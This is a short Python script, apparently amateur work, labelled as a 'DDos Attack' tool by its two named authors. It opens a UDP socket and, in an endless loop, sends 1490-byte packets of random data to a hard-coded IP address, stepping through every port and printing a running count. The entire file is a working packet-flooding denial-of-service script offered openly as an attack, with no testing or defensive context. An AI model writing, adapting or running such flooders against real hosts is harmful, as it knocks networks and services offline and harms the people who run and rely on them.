import sys
import os
import socket
import random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("figlet DDos Attack")
#########
print("MSSD DDOS Attack by Gowtham and Melvin")
ip = "192.168.122.241"
port = 80
###########
os.system("figlet Attack Starting")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1


